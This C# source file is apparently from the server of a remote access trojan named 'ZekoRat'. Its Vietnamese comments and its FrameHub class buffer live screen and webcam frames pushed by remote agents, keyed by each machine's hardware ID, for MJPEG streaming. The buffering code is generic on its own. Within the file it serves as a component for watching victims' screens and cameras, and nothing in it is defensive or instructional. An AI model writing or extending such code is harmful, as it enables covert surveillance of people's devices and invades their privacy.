using System.Collections.Concurrent;

namespace ZekoRat.Server;

/// <summary>
/// Buffer frame realtime do agent PUSH lên (evt "frame").
/// MJPEG chỉ đọc frame mới nhất → không round-trip lệnh mỗi frame như bản cũ.
/// </summary>
public static class FrameHub
{
    sealed record Frame(byte[] Data, DateTime Ts, long Seq);

    static readonly ConcurrentDictionary<string, Frame> _latest = new();
    static long _seq;
    static readonly TimeSpan Fresh = TimeSpan.FromSeconds(3);

    static string Key(string hwid, string kind) => hwid + "|" + kind;

    public static void Put(string hwid, string kind, byte[] data)
    {
        if (data.Length == 0) return;
        _latest[Key(hwid, kind)] = new Frame(data, DateTime.UtcNow, Interlocked.Increment(ref _seq));
    }

    public static (byte[] Data, long Seq)? Get(string hwid, string kind)
    {
        if (!_latest.TryGetValue(Key(hwid, kind), out var f)) return null;
        if (DateTime.UtcNow - f.Ts > Fresh) return null;
        return (f.Data, f.Seq);
    }

    public static bool Streaming(string hwid, string kind) => Get(hwid, kind) is not null;

    public static void Clear(string hwid)
    {
        _latest.TryRemove(Key(hwid, "screen"), out _);
        _latest.TryRemove(Key(hwid, "cam"), out _);
    }
}
